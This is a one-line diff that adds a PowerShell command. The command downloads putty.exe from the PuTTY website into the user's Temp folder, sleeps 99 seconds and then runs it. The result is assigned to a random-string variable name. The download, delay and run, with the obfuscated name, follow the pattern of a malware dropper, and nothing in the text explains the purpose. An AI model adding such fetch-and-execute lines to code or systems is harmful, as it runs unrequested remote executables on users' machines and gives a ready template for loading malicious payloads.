@@ -1,0 +1,1 @@
+$adsjhewjh234sdfjhSADJH=iwr 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe' -OutFile "C:\Users\$($env:USERNAME)\AppData\Local\Temp\putty.exe"; Start-Sleep -Seconds 99; & "C:\Users\$($env:USERNAME)\AppData\Local\Temp\putty.exe"
